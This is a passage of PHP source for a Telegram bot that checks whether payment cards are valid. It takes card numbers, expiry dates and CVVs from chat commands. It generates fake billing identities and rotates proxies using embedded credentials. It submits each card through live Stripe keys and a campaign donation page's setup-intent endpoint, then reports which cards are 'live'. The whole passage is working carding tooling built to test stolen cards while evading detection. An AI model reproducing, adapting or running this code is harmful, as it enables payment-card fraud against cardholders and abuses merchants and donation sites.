sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN LIVE! ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>BRAINTREE</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ '.$ingfo.' ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>BRAINTREE</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
curl_close($ch);
}


////////////////////////////////////////////////////////////////////////////////////////////////

if ((strpos($message, "!str1") === 0)||(strpos($message, "/str1") === 0)){  // ini stripe req 1
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$Supported = substr($cc, 0, 1);
 if($Supported == "4") {
    $cctype = '1';
    }
 elseif ($Supported == "5") {
    $cctype = '3';
    }
  else {
    $cctype = '2';
    }


////////////////////////// BIN LOOKUP/////////////////////////////////////////////




    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io'


////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1&time_on_page=184338&pasted_fields=number&guid=b37cc2b8-0031-4e89-8b66-aa0020f23053dc32df&muid=05064f85-eb6a-4c53-93d8-eee0ffedf78c63f99e&sid=0ba6a282-5c07-4c81-b97e-bb63538d22183d733c&key=pk_live_OTQMLIPzb7ZgnPRXyHlnXuGa&payment_user_agent=stripe.js%2F6c4e062&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&card[address_line1]='.$street.'&card[address_city]=+'.$city.'&card[address_zip]='.$zip.'&card[address_state]='.$state.'&card[address_country]=US');

$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result, 'incorrect_zip')) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, '"status": "succeeded"')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "Your payment has already been processed")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'Your card has insufficient funds.')) || (strpos($result, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc")) || (strpos($result, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN LIVE ★ 』</b>%0A<b>Country:</b> '.$name.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card does not support this type of purchase.")) || (strpos($result, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b> 『 ★ DECLINED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "pickup_card")) || (strpos($result, "lost_card")) || (strpos($result, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'The card number is incorrect.')) || (strpos($result, 'Your card number is incorrect.')) || (strpos($result, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'Your card has expired.')) || (strpos($result, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"unavailable"')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card was declined.")) || (strpos($result, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif(!$result){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE REQ 1</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
curl_close($ch);
}

////////////////////////////////////////////////////////////////////////////////////////////////

elseif (strpos($message, "/schk") === 0){ // ini stripe intent
$lista = substr($message, 6);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$name = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


////===[Webshare proxys for cc checker]===////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'rytqezmt-rotate:w13lyrpkuxgn',
  ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "LIVE!";
}
if (empty($ip1)){
$ip = "DEAD!:[".$rotate."]";
}

echo '[  IP: '.$ip.' ] ';


///////////////////////////////////////////////seti
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials);
curl_setopt($ch, CURLOPT_URL, 'https://www.parrott2020.org/api/non_oauth/stripe_intents/setup_intents/create');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/json',
'cookie: __cfduid=d766aa596c97a1324c0ebdcb6b627a47c1613743750; cf:aff_sub2=; cf:aff_sub3=; cf:aff_sub=; cf:affiliate_id=; cf:cf_affiliate_id=; cf:content=; cf:medium=; cf:name=; cf:source=; cf:term=; cf:MzM3MTIzMjM=:visited=true; cf:visitor_id=863e3088-1503-46aa-9699-8c67dd88bf93; addevent_track_cookie=1c0060e1-666f-47d8-2706-6aecfde5ad98; t9dx4fq2r06xz5vy=true; 8233149_viewed_15=23; __stripe_mid=66a3d528-5c74-40ce-95b8-a61222abd93afcc289; __cf_bm=a7100a33607f9393ff1c5c2986012beef1416538-1615388169-1800-AQYksn/93uuKyVkR+tQNxuCAgxII/cvlTQB71L6qbl2YSqrB1CtdhKlK35YiIum0jDKguHFIFWTuD9V4X5bSF5p/fKNVOD3jyAxbzjvOkhOv',
'origin: https://www.parrott2020.org',
'referer: https://www.parrott2020.org/donate-page', 
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'));
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"page_id":"NGU1Q2hSTXFnOTBJcjk1ZEk0elM0Zz09LS1xSld2NWlxYXN6NFFzbEw1cGtBbmtRPT0=--62b1728662353615bcb351dba6402f72ec5a4971","stripe_publishable_key":"pk_live_QNM4fX9VDG4nrXnJw5OavsoB00waXf9GrV","stripe_account_id":"acct_1FMlFiDFyKZHSeOF"}');
 $coli = curl_exec($ch);
 $seti = trim(strip_tags(getStr($coli,'"client_secret":"','"'))); 
$seti1 = trim(strip_tags(getstr($coli,'"client_secret":"','_secret_')));
///////////////////////////////////////////////   REQ 1

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti1.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/setup_intents/seti_1ITTUQDFyKZHSeOFwCdza4ER/confirm',
'scheme: https',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=Oak+&payment_method_data[billing_details][address][city]=Olf&payment_method_data[billing_details][address][postal_code]=13420&payment_method_data[billing_details][address][state]=Ny&payment_method_data[billing_details][address][country]=US&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=66a3d528-5c74-40ce-95b8-a61222abd93afcc289&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4&payment_method_data[time_on_page]=117325&payment_method_data[referrer]=https%3A%2F%2Fwww.parrott2020.org%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_QNM4fX9VDG4nrXnJw5OavsoB00waXf9GrV&_stripe_account=acct_1FMlFiDFyKZHSeOF&client_secret='.$seti.'');
 $result = curl_exec($ch);


//////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
if ((strpos($result, 'incorrect_zip')) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, '"status": "succeeded"')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "Your payment has already been processed")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'Your card has insufficient funds.')) || (strpos($result, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc")) || (strpos($result, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN LIVE ★ 』</b>%0A<b>Country:</b> '.$name.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card does not support this type of purchase.")) || (strpos($result, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b> 『 ★ DECLINED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "pickup_card")) || (strpos($result, "lost_card")) || (strpos($result, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'The card number is incorrect.')) || (strpos($result, 'Your card number is incorrect.')) || (strpos($result, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, 'Your card has expired.')) || (strpos($result, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
